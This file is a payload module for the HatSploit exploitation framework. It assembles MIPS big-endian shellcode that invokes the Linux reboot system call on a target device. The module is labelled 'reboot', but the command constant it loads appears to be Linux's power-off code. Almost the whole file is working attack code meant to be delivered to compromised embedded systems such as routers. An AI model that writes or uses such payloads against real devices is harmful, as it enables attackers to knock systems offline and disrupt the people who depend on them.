"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux mipsbe Reboot",
            'Payload': "linux/mipsbe/reboot",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Reboot payload for Linux mipsbe.",
            'Arch': ARCH_MIPSBE,
            'Platform': OS_LINUX,
            'Rank': "low",
            'Type': "one_side",
        })

    def run(self):
        return self.assemble(
            self.details['Arch'],
            """
            start:
                lui $a2, 0x4321
                ori $a2, $a2, 0xfedc
                lui $a1, 0x2812
                ori $a1, $a1, 0x1969
                lui $a0, 0xfee1
                ori $a0, $a0, 0xdead
                addiu $v0, $zero, 0xff8
                syscall 0x40404
            """,
        )
